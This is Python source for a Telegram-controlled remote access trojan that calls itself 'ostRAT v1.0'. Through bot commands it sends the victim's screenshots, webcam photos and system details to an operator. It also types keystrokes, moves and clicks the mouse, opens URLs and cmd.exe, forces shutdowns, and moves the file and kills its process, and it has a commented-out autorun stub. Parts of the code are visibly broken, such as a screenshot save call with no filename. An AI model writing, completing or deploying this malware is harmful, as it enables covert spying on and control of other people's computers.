from mouse import get_position as get_mouse_pos, move as move_mouse, click, right_click
from aiogram.types import KeyboardButton, ReplyKeyboardMarkup, FSInputFile, Message
from keyboard import press as k_press, release as k_release, write as k_write
from platform import system as pl_system, release as pl_release
from os import getlogin, remove, startfile, system as shell
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from PIL import ImageColor, ImageDraw, ImageGrab
from shutil import move as move_file, copy2
from aiogram.fsm.context import FSMContext
from aiogram import Bot, Dispatcher, F
from cv2 import VideoCapture, imwrite
from asyncio import run as async_run
from aiogram.filters import Command
from webbrowser import open_new_tab
from socket import gethostname
from pathlib import Path
from time import time
from sys import exit


class WriteState(StatesGroup):
    textcommand = State()


class BindState(StatesGroup):
    bind = State()


class MoveState(StatesGroup):
    MovetoOne = State()
    MovetoTwo = State()


class UrlState(StatesGroup):
    url = State()


class CamState(StatesGroup):
    cam = State()


class YesState(StatesGroup):
    accept = State()


def log(e: str) -> None:
    with open("log.txt", "a") as file:
        file.write(f"\n{time()+3600} - {e}\n")


storage = MemoryStorage()
TOKEN = "0000000000:aabbccddeeffgghhiiggkkllmmnnooppqqr"
adm = 0000000000
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=storage)

menu_raw = ReplyKeyboardBuilder()
menu_raw.row(*(KeyboardButton(text=i) for i in
               ("Online 🟢", "Screenshot 📸", "Off 🔴", "Reoff 🔄", "Autorun 🟢", "Delete 🗑")))
menu_raw.row(*(KeyboardButton(text=i) for i in
               ("Сmd 💻", "Url 🔗", "Cam 🎥", "Keyboard Menu ⭕️⌨️", "Mouse Menu ⭕️🖱")))
menu = ReplyKeyboardMarkup(keyboard=menu_raw.export(), resize_keyboard=True)

menukeyboard_raw = ReplyKeyboardBuilder().add(*(
    KeyboardButton(text=i) for i in
    ("Write ✍️", "Hotkeys 🔥", "Back ↩")))
menukeyboard = ReplyKeyboardMarkup(keyboard=menukeyboard_raw.export(), resize_keyboard=True)

menumouse_raw = ReplyKeyboardBuilder().add(*(
    KeyboardButton(text=i) for i in
    ("Move 🔀", "Pos 📍", "Left Button Click 🖱️◀️", "Right Button Click 🖱️▶️", "Back ↩")))
menumouse = ReplyKeyboardMarkup(keyboard=menumouse_raw.export(), resize_keyboard=True)


@dp.message(Command('start'))
async def start(message: Message):
    if message.chat.id == adm:
        username = message.chat.username
        await message.bot.send_message(adm, f"Hi, {username}. ostRAT v1.0 for you", reply_markup=menu)
    else:
        await message.reply("Hello, you don't have access.")


@dp.message(Command('locals'))
async def get_locals(message: Message):
    if message.chat.id == adm:
        await message.bot.send_message(adm, f"Hi, {message.chat.username}. ostRAT v1.0 for you", reply_markup=menu)
    else:
        await message.reply("Hello, you don't have access.")


@dp.message(F.text == 'Online 🟢')
async def online(message: Message):
    await message.bot.send_message(adm, f"🟢 Online!\nPC » {getlogin()} OS » {pl_system()} {pl_release()}\nIP » {gethostname()}", reply_markup=menu)


@dp.message(F.text == 'Autorun 🟢')
async def autorun(message: Message):
    try:
        await message.bot.send_message(adm, 'No autostart', parse_mode="Markdown")
        # copy2(__file__, {y})
        # await message.bot.send_message(adm, f'{Path(__file__).name} in StartUp! ✔️', parse_mode="Markdown")
        # startfile({x})
        # await message.bot.send_message(adm, f'{Path(__file__).name} runned from StartUp! ✔️', parse_mode="Markdown")
    except Exception as e:
        await message.bot.send_message(adm, f'Error ❌:\n{e}', reply_markup=menu, parse_mode="Markdown")


@dp.message(F.text == 'Off 🔴')
async def off(message: Message):
    await message.bot.send_message(adm, "Turn off! ✔️", reply_markup=menu)
    shell('shutdown -s /t 0 /f')


@dp.message(F.text == 'Reoff 🔄')
async def restart(message: Message):
    await message.bot.send_message(adm, "Reboot! ✔️", reply_markup=menu)
    shell('shutdown -r /t 0 /f')


@dp.message(F.text == 'Back ↩')
async def back(message: Message, state: FSMContext):
    await message.bot.send_message(adm, "Standart menu is open! ✔️", reply_markup=menu)
    state.clear()


@dp.message(F.text == 'Mouse Menu ⭕️🖱')
async def mouse_menu(message: Message):
    await message.bot.send_message(adm, "Mouse menu is open! ✔️", reply_markup=menumouse)


@dp.message(F.text == 'Move 🔀')
async def move_to(message: Message, state: FSMContext):
    await message.bot.send_message(adm, "Enter position: ")
    await state.set_state(MoveState.MovetoOne)


@dp.message(MoveState.MovetoOne)
async def move_to_in(message: Message, state: FSMContext):
    x, y = message.text.strip().split(',')
    move_mouse(int(x), int(y), absolute=True, duration=0.1)

    await message.bot.send_message(adm, "Send! ✔️")
    await state.clear()


@dp.message(F.text == 'Pos 📍')
async def get_pos(message: Message):
    await message.bot.send_message(adm, f"Mouse pos: {get_mouse_pos()}")


@dp.message(F.text == 'Left Button Click 🖱️◀️')
async def left_button_click(message: Message):
    click()
    await message.bot.send_message(adm, "Left mouse button is click! ✔️")


@dp.message(F.text == 'Right Button Click 🖱️▶️')
async def right_button_click(message: Message):
    right_click()
    await message.bot.send_message(adm, "Right mouse button is click! ✔️")


@dp.message(F.text == 'Keyboard Menu ⭕️⌨️')
async def keyboard_menu(message: Message):
    await message.bot.send_message(adm, "Keyboard menu is open! ✔️", reply_markup=menukeyboard)


@dp.message(F.text == 'Write ✍️')
async def write(message: Message, state: FSMContext):
    await message.bot.send_message(adm, "Enter text: ")
    await state.set_state(WriteState.textcommand)


@dp.message(WriteState.textcommand)
async def write_in(message: Message, state: FSMContext):
    # await state.update_data(textm=message.text)
    k_write(message.text)
    await message.bot.send_message(adm, "Send! ✔️")
    await state.clear()


@dp.message(F.text == 'Hotkeys 🔥')
async def hotkey(message: Message, state: FSMContext):
    await message.bot.send_message(adm, "Enter hotkey(button1+button2): ")
    await state.set_state(BindState.bind)


@dp.message(BindState.bind)
async def hotkey_in(message: Message, state: FSMContext):
    # await state.update_data(bindm=message.text)
    # bindm = message.text
    k_press(message.text)
    k_release(message.text)
    await message.bot.send_message(adm, "Send! ✔️")
    await state.clear()


@dp.message(F.text == 'Screenshot 📸')
async def get_screenshot(message: Message):
    try:
        position = get_mouse_pos()
        new_image = ImageGrab.grab()
        draw = ImageDraw.Draw(new_image)
        draw.rectangle((*position, position[0]+2, position[1]+2), fill=ImageColor.getrgb("red"))
        new_image.save()
        if message.chat.id == adm:
            await message.reply_photo(FSInputFile('temp.jpg'))
        remove('temp.jpg')
    except Exception as e:
        print(f'Error > Screenshot:\n{e}')


@dp.message(F.text == 'Cam 🎥')
async def get_camera(message: Message):
    # cam = message.text
    for i in range(10):
        cam = VideoCapture(i)
        result, image = cam.read()
        if result:
            imwrite('cam.png', image)
            await message.reply_photo(FSInputFile('cam.png'))
            remove('cam.png')
            break
        else:
            await message.bot.send_message(adm, 'Trying another web-camera...')


@dp.message(F.text == 'Сmd 💻')
async def open_cmd(message: Message):
    try:
        startfile('cmd.exe')
        await message.bot.send_message(adm, 'Cmd is open! ✔️')
    except Exception as e:
        await message.bot.send_message(adm, f'Error > RunCMD:\n{e}')


@dp.message(F.text == 'Url 🔗')
async def open_url(message: Message, state: FSMContext):
    await message.bot.send_message(adm, "Enter link: ")
    await state.set_state(UrlState.url)


@dp.message(UrlState.url)
async def open_url_in(message: Message, state: FSMContext):
    # await state.update_data()
    # data = await state.get_data()
    url = message.text
    open_new_tab(url)
    await message.bot.send_message(adm, "Link is open! ✔️")
    await state.clear()


@dp.message(F.text == 'Delete 🗑')
async def delete(message: Message, state: FSMContext):
    await message.bot.send_message(adm, "Confirm delete(y/n): ")
    await state.set_state(YesState.accept)


@dp.message(YesState.accept)
async def delete_accept(message: Message, state: FSMContext):
    # await state.update_data(accept=message.text)
    # data = await state.get_data()
    accept: str = message.text[0]  # 'no'[0] == 'n'
    if accept.lower() == "y":
        move_file(__file__, Path('C:/ProgramData'))
        shell(f'taskkill /im {Path(__file__).name} /f')
        await message.bot.send_message(adm, "ostRAT deleted! ✔️")
    elif accept.lower() == "n":
        await message.bot.send_message(adm, 'Delete canceled! ❌', parse_mode="Markdown")
    await state.clear()


try:
    async_run(dp.start_polling(bot))
except Exception as e:
    raise e
    # startfile(__file__)
exit(0)
